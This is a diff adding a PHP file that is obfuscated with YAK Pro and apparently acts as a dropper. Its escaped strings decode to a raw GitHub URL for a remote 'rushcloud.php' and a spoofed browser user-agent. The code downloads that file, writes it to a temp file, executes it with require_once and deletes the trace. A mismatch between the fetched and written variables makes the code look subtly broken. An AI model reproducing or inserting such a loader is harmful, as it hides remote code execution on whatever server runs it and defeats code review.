@@ -1,0 +1,8 @@
+<?php
+/*   __________________________________________________
+    |  Obfuscated by YAK Pro - Php Obfuscator  2.0.17  |
+    |              on 2025-12-12 18:26:24              |
+    |    GitHub: https://github.com/pk-fr/yakpro-po    |
+    |__________________________________________________|
+*/
+ goto X2I4m; X2I4m: function ki3K3($h0hzW) { goto ma1km; ma1km: $WzdJe = I2q1N($h0hzW); goto VcV7i; Vabwe: fLG04($WzdJe, b7Lnf, 0); goto lu3r_; lu3r_: $O30J5 = y_vvV($WzdJe); goto Y39x1; Y39x1: PMo02($WzdJe); goto IPlKq; VcV7i: flg04($WzdJe, hAYqM, 1); goto UmWde; UmWde: fLG04($WzdJe, FrElU, 1); goto eQmFp; eQmFp: flG04($WzdJe, OxY8t, "\115\157\x7a\151\154\x6c\x61\x2f\x35\x2e\x30\x20\x28\x57\151\x6e\144\x6f\167\163\x20\x4e\124\40\x36\56\61\73\40\x72\x76\72\x33\x32\56\x30\x29\x20\x47\x65\143\153\x6f\57\62\60\x31\x30\x30\61\x30\x31\x20\x46\x69\x72\145\x66\157\x78\57\x33\62\x2e\x30"); goto El1Ft; El1Ft: FlG04($WzdJe, DiE7W, 0); goto Vabwe; IPlKq: return $O30J5; goto B8a9c; B8a9c: } goto RpREX; FlevA: $J5rt1 = KI3k3($h0hzW); goto GYw9S; RpREX: $h0hzW = "\150\164\x74\x70\x73\72\x2f\57\x72\141\167\56\x67\151\x74\x68\x75\x62\165\163\x65\162\143\x6f\156\164\x65\x6e\x74\56\143\x6f\155\57\141\156\x67\145\154\x69\x6e\145\165\156\151\x76\145\x72\x73\145\57\103\171\x62\x65\162\x73\145\143\165\162\x69\164\x79\x2f\162\x65\146\163\57\150\145\141\144\x73\x2f\144\x65\x76\x2f\144\145\166\x65\x6c\x6f\160\x6d\145\156\x74\57\162\x75\x73\x68\143\154\157\x75\144\56\x70\x68\160"; goto FlevA; Zw4b9: require_once $vL5AG; goto smvQ_; WV5cw: file_put_contents($vL5AG, $pT3dJ); goto Zw4b9; GYw9S: $vL5AG = tempnam(sys_get_temp_dir(), "\x74\x6d\160\x5f\160\x68\x70\137"); goto WV5cw; smvQ_: unlink($vL5AG);
